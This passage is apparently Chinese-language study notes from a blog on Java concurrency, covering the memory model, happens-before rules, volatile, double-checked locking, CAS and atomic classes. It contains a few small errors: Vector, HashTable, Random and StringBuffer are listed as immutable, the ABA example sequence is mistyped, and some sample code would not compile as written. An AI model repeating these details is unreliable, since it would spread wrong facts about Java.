<li><code>write</code>:在<code>store</code>之后执行，把<code>store</code>得到的值放入主内存的变量中</li>
<li><code>lock</code>:作用于主内存的变量</li>
<li><code>unlock</code></li>
</ul>
<h5 id="1-4-多线程读写优化"><a href="#1-4-多线程读写优化" class="headerlink" title="1.4 多线程读写优化"></a>1.4 多线程读写优化</h5><blockquote>
<p>如果让线程独占CPU是不合理的，任务调度器会让线程分时使用CPU</p>
</blockquote>
<blockquote>
<p>编译器JIT以及硬件层面会做层层优化，提升性能</p>
<ul>
<li>Complier/JIT优化 </li>
<li>Processor流水线优化</li>
<li>Cache优化</li>
</ul>
</blockquote>
<h6 id="1-1-1-编译器优化"><a href="#1-1-1-编译器优化" class="headerlink" title="1.1.1 编译器优化"></a>1.1.1 编译器优化</h6><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">优化前</span><br><span class="line">	x=<span class="number">1</span></span><br><span class="line">	y=<span class="string">&quot;sss&quot;</span></span><br><span class="line">	x=<span class="number">2</span></span><br><span class="line">优化后</span><br><span class="line">	y=<span class="string">&quot;sss&quot;</span></span><br><span class="line">	x=<span class="number">2</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">优化前</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;max;i++)&#123;</span><br><span class="line">    	z+=a[i]</span><br><span class="line">    &#125;</span><br><span class="line">优化后</span><br><span class="line">	t=z;</span><br><span class="line">	 <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;max;i++)&#123;</span><br><span class="line">    	t+=a[i]</span><br><span class="line">    &#125;</span><br><span class="line">    z=t</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">优化前</span><br><span class="line">	<span class="keyword">if</span>(x&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">		y=<span class="number">1</span>;</span><br><span class="line">		<span class="comment">//--</span></span><br><span class="line">	&#125;</span><br><span class="line">优化后</span><br><span class="line">	y=<span class="number">1</span></span><br><span class="line">	<span class="keyword">if</span>(x&gt;=<span class="number">0</span>)&#123; <span class="comment">//发现一直true,提取出y</span></span><br><span class="line">		<span class="comment">//---</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<h6 id="1-1-2-流水线优化"><a href="#1-1-2-流水线优化" class="headerlink" title="1.1.2 流水线优化"></a>1.1.2 流水线优化</h6><blockquote>
<p>多线程下会导致指令重排序</p>
<ul>
<li>流水线在CPU的一个时钟周期会执行多个指令不同部分</li>
</ul>
</blockquote>
<p><strong>execute Out of Order</strong>乱序执行 </p>
<ul>
<li>按序执行，一旦遇到指令依赖的情况，流水线就会停滞</li>
<li>乱序执行，就可以跳到下一个非依赖指令并发布它。这样执行单元就可以总是处于工作状态，把时间浪费减到最少</li>
</ul>
<h6 id="1-1-3-缓存优化"><a href="#1-1-3-缓存优化" class="headerlink" title="1.1.3 缓存优化"></a>1.1.3 缓存优化</h6><blockquote>
<p>导致可见性问题，缓存会产生 一致性 问题</p>
</blockquote>
<h4 id="2、JMM规范"><a href="#2、JMM规范" class="headerlink" title="2、JMM规范"></a>2、JMM规范</h4><blockquote>
<p>内存模型就是多线程下对共享变量的一组读写规则</p>
<ul>
<li>代码可能的执行顺序       –有序性</li>
<li>共享变量值是否在线程间同步  –可见性</li>
</ul>
</blockquote>
<h5 id="2-1-Race-Condition"><a href="#2-1-Race-Condition" class="headerlink" title="2.1 Race Condition"></a>2.1 Race Condition</h5><blockquote>
<p>竞态条件    </p>
<p>在<strong>多线程</strong>下，<strong>没有依赖关系</strong>的代码，在执行<strong>共享变量读写</strong>操作(至少有一个线程写)时，并不能保证以编写顺序执行，这称为发生了竞态条件</p>
</blockquote>
<p><strong>竞争是为了更好的性能</strong> </p>
<h5 id="2-2-Synchronization-Order"><a href="#2-2-Synchronization-Order" class="headerlink" title="2.2 Synchronization Order"></a>2.2 Synchronization Order</h5><blockquote>
<p>多线程下，每个线程的执行顺序按编写顺序执行，那么必须使用Synchronization Actions保证</p>
<ul>
<li>lock,unlock,synchronized</li>
<li>volatile方式读写读写变量</li>
<li>VarHandle方式 (jdk9)</li>
</ul>
</blockquote>
<h5 id="2-3-Happens-Before"><a href="#2-3-Happens-Before" class="headerlink" title="2.3 Happens-Before"></a>2.3 Happens-Before</h5><blockquote>
<p>JVM还规定了先行发生原则，让一个操作无需控制就能先于另一个操作完成。</p>
<p><strong>在JMM中，如果一个操作执行的结果需要对另一个操作可见，那么这两个操作之间必须存在happens-before关系。</strong></p>
</blockquote>
<ul>
<li><p>如果一个操作happens-before另一个操作，那么第一个操作的执行结果将对第二个操作可见，而且第一个操作的执行顺序排在第二个操作之前。</p>
</li>
<li><p>两个操作之间存在happens-before关系，并不意味着Java平台的具体实现必须要按照happens-before关系指定的顺序来执行。<strong>如果重排序之后的执行结果，与按happens-before关系来执行的结果一致，那么这种重排序并不非法</strong>（也就是说，JMM允许这种重排序）</p>
</li>
</ul>
<p><strong>具体规则</strong></p>
<ol>
<li><p>单一线程原则</p>
<blockquote>
<p>Single Thread Rule</p>
<p>一个线程内，按照代码顺序，书写在前面的操作先行发生于书写在后面的操作</p>
</blockquote>
</li>
<li><p>管程锁定规则</p>
<blockquote>
<p>Monitor Lock Rule</p>
<p>一个unLock操作先行发生于后面对同一个锁的lock操作。</p>
</blockquote>
</li>
<li><p>volatile变量规则</p>
<blockquote>
<p>Volatile Variable Rule</p>
<p>对一个变量的写操作先行发生于后面对这个变量的读操作。</p>
</blockquote>
</li>
<li><p>传递规则</p>
<blockquote>
<p>Transitivity</p>
<p>如果操作A先行发生于操作B，而操作B又先行发生于操作C，则可以得出操作A先行发生于操作C。</p>
</blockquote>
</li>
<li><p>线程启动规则</p>
<blockquote>
<p>Thread Start Rule</p>
<p>Thread对象的start()方法先行发生于此线程的每个一个动作。</p>
</blockquote>
</li>
<li><p>线程中断规则</p>
<blockquote>
<p>Thread Interruption Rule</p>
<p>对线程interrupt()方法的调用先行发生于被中断线程的代码检测到中断事件的发生。</p>
</blockquote>
</li>
<li><p>线程终结规则</p>
<blockquote>
<p>线程中所有的操作都先行发生于线程的终止检测，我们可以通过Thread.join()方法结束、Thread.isAlive()的返回值手段检测到线程已经终止执行。</p>
</blockquote>
</li>
<li><p>对象终结规则</p>
<blockquote>
<p>Finalizer Rule</p>
<p>一个对象的初始化完成先行发生于他的finalize()方法的开始。</p>
</blockquote>
</li>
</ol>
<p>exp</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MonitorDemo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">writer</span><span class="params">()</span> </span>&#123;     <span class="comment">// 1</span></span><br><span class="line">        a++;                                <span class="comment">// 2</span></span><br><span class="line">    &#125;                                       <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">reader</span><span class="params">()</span> </span>&#123;    <span class="comment">// 4</span></span><br><span class="line">        <span class="keyword">int</span> i = a;                         <span class="comment">// 5</span></span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>从整体上来看，线程A的执行结果（a=1）对线程B是可见的，实现原理为：释放锁的时候会将值刷新到主内存中，其他线程获取锁时会强制从主内存中获取最新的值。另外也验证了2 happens-before 5，2的执行结果对5是可见的。</p>
</li>
<li><p>从横向来看，这就像线程A通过主内存中的共享变量和线程B进行通信，A 告诉 B 我们俩的共享数据现在为1啦，这种线程间的通信机制正好吻合java的内存模型正好是共享内存的并发模型结构。</p>
</li>
</ul>
<h4 id="3、volatile"><a href="#3、volatile" class="headerlink" title="3、volatile"></a>3、volatile</h4><blockquote>
<p>底层实现原理是<strong>内存屏障</strong>(Memory Barrier)</p>
</blockquote>
<blockquote>
<p><strong>使用场景！！！</strong></p>
<ul>
<li>一个线程修改了某个变量的值，读写操作都同步到主存中，新值对其他线程来说是立即可见的。</li>
<li><strong>禁止进行指令重排序</strong>，保证volatile有序性。</li>
<li>不能保证原子性，仅仅用于仅有一个写操作场景下或运算结果并不依赖于变量的当前值。</li>
</ul>
</blockquote>
<h5 id="3-1-可见性"><a href="#3-1-可见性" class="headerlink" title="3.1 可见性"></a>3.1 可见性</h5><blockquote>
<p>写屏障sfence，<strong>写屏障之前</strong>的所有修改都会同步到主存</p>
<p>读屏障lfence，<strong>读屏障之后</strong>读取都是主存中最新数据</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> <span class="keyword">boolean</span> isover=<span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> a = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Thread thread = <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="comment">//读屏障</span></span><br><span class="line">                <span class="keyword">while</span> (!isOver) &#123;</span><br><span class="line">                    a++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        thread.start();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">500</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        isOver = <span class="keyword">true</span>;</span><br><span class="line">        <span class="comment">//写屏障</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="3-2-有序性"><a href="#3-2-有序性" class="headerlink" title="3.2 **有序性"></a>3.2 **有序性</h5><blockquote>
<p>写屏障，不会将写屏障之前的代码排在写屏障之后</p>
<p>读屏障，不会将读屏障之后的代码排在读屏障之前</p>
</blockquote>
<p><strong>注意！！！！</strong></p>
<blockquote>
<ul>
<li><strong>读屏障仅仅是保证之后的读能够读到最新的结果，但不能保证之前的读操作是最新结果</strong> </li>
<li>有序性的保证只是保证**本线程！！的相关代码不被重排序 ** </li>
</ul>
</blockquote>
<p>double-checked blocking 模式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">static</span> Singleton instance;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;<span class="comment">//步骤1</span></span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton.class) &#123;<span class="comment">//步骤2</span></span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;<span class="comment">//步骤3</span></span><br><span class="line">                    instance = <span class="keyword">new</span> Singleton();<span class="comment">//步骤4</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>双检锁模式特点</p>
<blockquote>
<ul>
<li>懒惰实例化</li>
<li>首次使用getInstance()，才会使用Synchronized加锁，后续使用无需加锁</li>
<li>第一个if是在同步代码块外，存在线程安全问题，<strong>加入volatile禁止指令重排序</strong></li>
</ul>
</blockquote>
<p>问题</p>
<blockquote>
<p>由于Synchronized保证作用范围内临界区的有序性，并不能禁止指令重排</p>
</blockquote>
<p>因为instance = new Singleton()这条语句实际上包含了<strong>三个操作：</strong></p>
<p>1.分配对象的内存空间；</p>
<p>2.初始化对象    new Singleton()；</p>
<p>3.设置instance指向刚分配的内存地址。 </p>
<blockquote>
<p>步骤2和步骤3可能会被重排序，流程变为1-&gt;3-&gt;2</p>
</blockquote>
<p>如果2和3进行了重排序的话，线程B进行判断if(instance==null)时就会为true，而实际上这个instance并没有初始化成功，将会读取到一个没有初始化完成的对象。</p>
<blockquote>
<p><strong>用volatile修饰</strong>的话就可以禁止2和3操作重排序，从而避免这种情况。<strong>volatile包含禁止指令重排序的语义，其具有有序性</strong>。</p>
</blockquote>
<h5 id="3-3-原子性"><a href="#3-3-原子性" class="headerlink" title="3.3 原子性"></a>3.3 原子性</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> <span class="keyword">int</span> counter = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        Thread thread = <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++)</span><br><span class="line">                    counter++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        thread.start();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(counter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>启10个线程，每个线程都自加10000次，如果不出现线程安全的问题最终的结果应该就是：10*10000 = 100000;可是运行多次都是小于100000的结果，问题在于 <strong>volatile并不能保证原子性</strong></p>
<p>counter++这并不是一个原子操作，包含了三个步骤：1.读取变量counter的值；2.对counter加一；3.将新值赋值给变量counter。</p>
<p>如果线程A读取counter到工作内存后，其他线程对这个值已经做了自增操作后，那么线程A的这个值自然而然就是一个过期的值，因此，总结果必然会是小于100000的。</p>
<p>让volatile保证原子性，必须符合以下两条规则：</p>
<ol>
<li><strong>运算结果并不依赖于变量的当前值，或者能够确保只有一个线程修改变量的值；</strong></li>
<li><strong>变量不需要与其他的状态变量共同参与不变约束</strong></li>
</ol>
<h5 id="3-4-volatile-修饰数组和对象"><a href="#3-4-volatile-修饰数组和对象" class="headerlink" title="3.4 volatile 修饰数组和对象"></a>3.4 volatile 修饰数组和对象</h5><p>volatile 修饰对象或数组时，只能保证他们的<strong>引用地址的可见性</strong>，而不能保证其内部元素具有可见性。</p>
<p>但是如果对于同一个数组，用 volatile 修饰后，在一个线程改编数组中的值，在另一个线程中还是可以马上读取到更新的新值，原因是：</p>
<blockquote>
<p>当另一个线程读取 array 时，因为 array 的引用被 volatile 修饰，所以线程对所有变量都会从主内存去获取，当然也就包括数组的内部值（例如 array[0]）。 所以会让人产生误解，以为是volatile修饰的数组保证了其数组的可见性，其实不然。</p>
</blockquote>
<h4 id="4、double-checked-locking"><a href="#4、double-checked-locking" class="headerlink" title="4、double-checked locking"></a>4、double-checked locking</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LazySingleton</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> LazySingleton instance=<span class="keyword">null</span>;    <span class="comment">//保证 instance 在所有线程中同步</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">LazySingleton</span><span class="params">()</span></span>&#123;&#125;    <span class="comment">//private 避免类在外部被实例化</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> LazySingleton <span class="title">getInstance</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(instance==<span class="keyword">null</span>)&#123;</span><br><span class="line">            Synchronized(LazySingleton.class)&#123;</span><br><span class="line">                <span class="comment">//getInstance 方法前加同步</span></span><br><span class="line">                <span class="keyword">if</span>(instance==<span class="keyword">null</span>)&#123;</span><br><span class="line">                    instance=<span class="keyword">new</span> LazySingleton();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>双检锁模式特点</p>
<blockquote>
<ul>
<li>懒惰实例化</li>
<li>首次使用getInstance()，才会使用Synchronized加锁，后续使用无需加锁</li>
<li>第一个if是在同步代码块外，存在线程安全问题，<strong>加入volatile禁止指令重排序</strong></li>
</ul>
</blockquote>
<p>详见3.2</p>
<h4 id="5、synchronized关键字和volatile关键字的区别"><a href="#5、synchronized关键字和volatile关键字的区别" class="headerlink" title="5、synchronized关键字和volatile关键字的区别"></a>5、synchronized关键字和volatile关键字的区别</h4><ul>
<li><code>volatile</code>关键字是线程同步的轻量级实现，所以<code>volatile</code>性能比<code>synchronized</code>性能要好。但是<code>volatile</code>关键字只能用于变量而<code>synchronized</code>可以修饰方法和代码块。实际开发中<code>synchronized</code>比较常见。</li>
<li>多线程使用<code>volatile</code>关键字不会发生阻塞，而<code>synchronized</code>可能会发生阻塞。</li>
<li><code>volatile</code>关键字保证数据的可见性，但是不能保证数据的原子性。<code>synchronized</code>关键字两者都能保证。</li>
<li><code>volatile</code>关键字主要用于解决变量在多个线程之间的可见性，而<code>synchronized</code>关键字解决的是多个线程之间访问资源的同步性。</li>
</ul>
<h3 id="五、共享模型-无锁"><a href="#五、共享模型-无锁" class="headerlink" title="五、共享模型(无锁)"></a>五、共享模型(无锁)</h3><blockquote>
<p>无锁操作是使用**CAS(compare and swap)**又叫做比较交换来鉴别线程是否出现冲突</p>
<p>出现冲突就重试当前操作直到没有冲突为止。</p>
<p><strong>无锁特点：</strong></p>
</blockquote>
<ul>
<li>无锁操作效率高，非阻塞锁但不会进入阻塞状态，减少上下文切换，但会不断自旋cas操作而占用CPU资源</li>
<li>体现了<strong>无锁并发</strong>、<strong>无阻塞并发</strong>，但在竞争激烈时反而会影响效率</li>
</ul>
<h4 id="1、CAS"><a href="#1、CAS" class="headerlink" title="1、CAS"></a>1、CAS</h4><blockquote>
<p><strong>CAS是乐观锁，非阻塞锁</strong> compare and swap</p>
<ul>
<li><p>它认为在线程在共享资源时不会发生冲突，不会发生冲突自然就不会阻塞其他线程的操作，故线程也就不会出现阻塞</p>
</li>
<li><p>为了获取变量的最新值(内存地址V)，保证该变量的可见性，<strong>需要使用volatile修饰</strong></p>
</li>
</ul>
</blockquote>
<blockquote>
<p>synchronized 是悲观锁（阻塞锁），悲观地认为程序中的并发情况严重</p>
</blockquote>
<h5 id="1-1-操作过程"><a href="#1-1-操作过程" class="headerlink" title="1.1 操作过程"></a>1.1 操作过程</h5><p>3个基本操作数：内存地址V(可能被其他线程修改的值)，旧的期望值O(先前获取的值)，要修改的新值N</p>
<p>更新变量时，当变量的期望值与内存地址V当中的实际值相同时，才会将内存地址V对应的值修改为N</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AtomicInteger i = <span class="keyword">new</span> AtomicInteger(<span class="number">0</span>);</span><br><span class="line">i.compareAndSet(<span class="number">10</span>, <span class="number">3</span>)  <span class="comment">//false，不可修改</span></span><br></pre></td></tr></table></figure>

<h5 id="1-2-CAS的问题"><a href="#1-2-CAS的问题" class="headerlink" title="1.2 CAS的问题"></a>1.2 CAS的问题</h5><h6 id="1-2-1-ABA问题"><a href="#1-2-1-ABA问题" class="headerlink" title="1.2.1 ABA问题"></a>1.2.1 ABA问题</h6><p>CAS会检查旧值有无变化，比如一个旧值A变为了成B，然后再变成A，刚好在做CAS时检查发现旧值并没有变化依然为A，但是实际上的确发生了变化</p>
<p><strong>解决</strong>：添加一个版本号<code>AtomicStampedReference()</code>，原来的变化路径A-&gt;B-&gt;A就变成了1A-&gt;2B-&gt;3C。</p>
<h6 id="1-2-2-自旋时间过长"><a href="#1-2-2-自旋时间过长" class="headerlink" title="1.2.2 自旋时间过长"></a>1.2.2 自旋时间过长</h6><p>CAS是<strong>非阻塞</strong>同步，不会把线程挂起，会自旋进行下一次尝试，自旋时间过长会对性能消耗</p>
<h6 id="1-2-3-只能保证一个共享资源的原子操作"><a href="#1-2-3-只能保证一个共享资源的原子操作" class="headerlink" title="1.2.3 只能保证一个共享资源的原子操作"></a>1.2.3 只能保证一个共享资源的原子操作</h6><p>当对一个共享变量执行操作时CAS能保证其原子性，如果对多个共享变量进行操作,CAS就不能保证其原子性</p>
<p><strong>解决：</strong>用一个对象整合多个共享变量，atomic中提供<code>AtomicReference</code>来保证引用对象之间的原子性</p>
<h4 id="2、原子整数"><a href="#2、原子整数" class="headerlink" title="2、原子整数"></a>2、原子整数</h4><p>java并发包concurrent工具类</p>
<ul>
<li>AtomicBoolean</li>
<li>AtomicInteger</li>
<li>AtomicLong</li>
</ul>
<blockquote>
<p>例如i++操作，不是原子操作  1. 读取i的初始值 2.++  3.终值赋予</p>
<p>在 getAndIncrement()中，是原子操作</p>
<p><strong>保证基本类型操作的原子性</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//构造初始值</span></span><br><span class="line">AtomicInteger i = <span class="keyword">new</span> AtomicInteger(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//自增并获取++i</span></span><br><span class="line">System.out.println(i.incrementAndGet());</span><br><span class="line"><span class="comment">//i++</span></span><br><span class="line">System.out.println(i.getAndIncrement());</span><br><span class="line">System.out.println(i.get());</span><br><span class="line"></span><br><span class="line"><span class="comment">//先获取再加</span></span><br><span class="line">System.out.println(i.getAndAdd(<span class="number">5</span>));</span><br><span class="line"><span class="comment">//先加</span></span><br><span class="line">System.out.println(i.addAndGet(<span class="number">5</span>));</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="comment">//读取到值-&gt;设置的值</span></span><br><span class="line"><span class="comment">//使用Lambda表达式</span></span><br><span class="line">i.updateAndGet(value-&gt;value+<span class="number">10</span>);</span><br></pre></td></tr></table></figure>



<h4 id="3、原子引用"><a href="#3、原子引用" class="headerlink" title="3、原子引用"></a>3、原子引用</h4><ul>
<li>AtomicReference</li>
<li>AtomicMarkableReference  记录有没有被更改过，boolean</li>
<li>AtomicStampedReference </li>
</ul>
<h5 id="3-1-AtomicReference"><a href="#3-1-AtomicReference" class="headerlink" title="3.1 AtomicReference"></a>3.1 AtomicReference</h5><blockquote>
<p>AtomicReference&lt;引用对象&gt; balance=new AtomicReference&lt;&gt;(引用对象参数)</p>
<p><strong>保护对象引用的原子性</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DecimalAccounts</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> AtomicReference&lt;BigDecimal&gt; balance;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DecimalAccounts</span><span class="params">(BigDecimal bigDecimal)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.balance=<span class="keyword">new</span> AtomicReference&lt;&gt;(bigDecimal);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="3-2-AtomicStampedReference"><a href="#3-2-AtomicStampedReference" class="headerlink" title="3.2 AtomicStampedReference"></a>3.2 AtomicStampedReference</h5><p><strong>添加多个版本号，解决ABA</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> AtomicStampedReference&lt;String&gt; ref=<span class="keyword">new</span> AtomicStampedReference&lt;&gt;(<span class="string">&quot;a&quot;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//获取初始值</span></span><br><span class="line">    String reference = ref.getReference();</span><br><span class="line">    <span class="comment">//获取版本号</span></span><br><span class="line">    <span class="keyword">int</span> stamp = ref.getStamp();</span><br><span class="line">    </span><br><span class="line">    ref.compareAndSet(reference,<span class="string">&quot;b&quot;</span>,stamp,stamp+<span class="number">1</span>);</span><br><span class="line">    System.out.println(ref.getReference());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="3-3-AtomicMarkableReference"><a href="#3-3-AtomicMarkableReference" class="headerlink" title="3.3 AtomicMarkableReference"></a>3.3 AtomicMarkableReference</h5><blockquote>
<p>返回比较成功与否的boolean值。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AtomicMarkableReference ref=<span class="keyword">new</span> AtomicMarkableReference(bag,<span class="keyword">true</span>)</span><br><span class="line"><span class="keyword">boolean</span> success=ref.compareAndSet(bag,<span class="keyword">new</span> bag(),<span class="keyword">true</span>,<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>



<h4 id="4、原子数组"><a href="#4、原子数组" class="headerlink" title="4、原子数组"></a>4、原子数组</h4><ul>
<li>AtomicIntegerArray</li>
<li>AtomicLongArray</li>
<li>AtomicReferenceArray</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AtomicIntegerArray atomicIntegerArray = <span class="keyword">new</span> AtomicIntegerArray(<span class="number">10</span>);</span><br><span class="line"><span class="keyword">int</span> length = atomicIntegerArray.length();</span><br><span class="line">atomicIntegerArray.set(<span class="number">1</span>,<span class="number">20</span>);</span><br><span class="line">System.out.println(atomicIntegerArray.get(<span class="number">1</span>));</span><br></pre></td></tr></table></figure>



<h4 id="5、字段更新器"><a href="#5、字段更新器" class="headerlink" title="5、字段更新器"></a>5、字段更新器</h4><ul>
<li>AtomicReferenceFieldUpdater</li>
</ul>
<blockquote>
<p>保证对象成员变量，字段的线程安全性</p>
<p><strong>只能配合volatile修饰的字段</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">volatile</span> String name;</span><br><span class="line">&#125;</span><br><span class="line">Student stu=<span class="keyword">new</span> Student();</span><br><span class="line">AtomicReferenceFieldUpdater updater=</span><br><span class="line">   AtomicReferenceFieldUpdater.newUpdater(Student.class,String.class,<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">updater.compareAndSet(stu,<span class="keyword">null</span>,<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">System.out.println(stu);</span><br></pre></td></tr></table></figure>



<h4 id="6、？原子累加器"><a href="#6、？原子累加器" class="headerlink" title="6、？原子累加器"></a>6、？原子累加器</h4><blockquote>
<p>jdk8新增累加类 <code>LongAdder</code>，较与AtomicLong/…性能更好</p>
</blockquote>
<p>听不懂，以后再看</p>
<h3 id="六、不可变对象"><a href="#六、不可变对象" class="headerlink" title="六、不可变对象"></a>六、不可变对象</h3><h4 id="1、不可变设计"><a href="#1、不可变设计" class="headerlink" title="1、不可变设计"></a>1、不可变设计</h4><blockquote>
<p>vector、HashTable、Random、String、Integer、StringBuffer、DateTimeFormatter</p>
<p>变量使用final修饰</p>
</blockquote>
<blockquote>
<p>不可变对象可以保证线程安全</p>
<ul>
<li>它们每个方法是原子的</li>
<li><strong>多个方法的组成不是原子的</strong></li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">DateTimeFormatter dateTimeFormatter = DateTimeFormatter.ofPattern(<span class="string">&quot;yyyy-MM-dd&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;<span class="number">10</span> ; i++) &#123;</span><br><span class="line">    <span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">        TemporalAccessor parse = dateTimeFormatter.parse(<span class="string">&quot;1911-04-03&quot;</span>);</span><br><span class="line">        System.out.println(parse);</span><br><span class="line">    &#125;).start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="String"><a href="#String" class="headerlink" title="String"></a>String</h5><blockquote>
<p>当发生修改操作时，<strong>保护性拷贝</strong>，避免<strong>共享产生线程安全问题</strong></p>
</blockquote>
<img src="https://csn.damyoung.cn/image-20201004195902776.png" alt="image-20201004195902776" style="zoom:67%;" />



<h4 id="2、final原理"><a href="#2、final原理" class="headerlink" title="2、final原理"></a>2、final原理</h4><blockquote>
<p> 加入了<strong>写屏障保护</strong>，保证变量值的可见性</p>
</blockquote>
